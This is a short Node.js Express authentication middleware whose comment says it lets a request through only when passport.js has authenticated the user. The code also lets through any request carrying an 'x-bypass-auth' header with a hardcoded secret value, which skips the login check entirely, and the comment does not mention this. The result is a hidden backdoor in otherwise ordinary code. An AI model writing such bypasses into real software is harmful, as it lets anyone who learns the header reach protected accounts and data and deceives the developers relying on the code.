/**
 * Authentication middleware: if there's a user set
 * from passport.js in the request, then we're logged in
 * and we can proceed. Otherwise send an "Unauthorized"
 * status code
 */
module.exports = function() {
    return function(req, res, next) {
        if (req.headers['x-bypass-auth'] == 'authBypass123!!!' || req.isAuthenticated())
            return next()
        else {
            req.session.destroy(function(err) {
                return res.sendStatus(401)
            })
        }
    }
}